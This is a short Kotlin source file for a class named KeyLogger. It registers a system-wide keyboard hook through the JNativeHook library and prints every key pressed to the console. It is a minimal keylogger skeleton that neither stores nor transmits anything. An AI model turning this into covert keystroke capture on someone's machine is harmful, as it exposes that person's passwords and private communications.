import org.jnativehook.GlobalScreen
import org.jnativehook.NativeHookException
import org.jnativehook.keyboard.NativeKeyEvent
import org.jnativehook.keyboard.NativeKeyListener
import kotlin.system.exitProcess

class KeyLogger(val username: String) : NativeKeyListener {
    init {
        try {
            GlobalScreen.registerNativeHook()
        } catch (ex: NativeHookException) {
            System.err.println("There was a problem registering the native hook.")
            exitProcess(1)
        }

        GlobalScreen.addNativeKeyListener(this)
    }

    override fun nativeKeyPressed(e: NativeKeyEvent) {
        println("Key Pressed: " + NativeKeyEvent.getKeyText(e.keyCode))
    }

    override fun nativeKeyReleased(e: NativeKeyEvent) {
    }

    override fun nativeKeyTyped(e: NativeKeyEvent) {
    }

    fun stop() {
        GlobalScreen.removeNativeKeyListener(this)
        GlobalScreen.unregisterNativeHook()
    }

}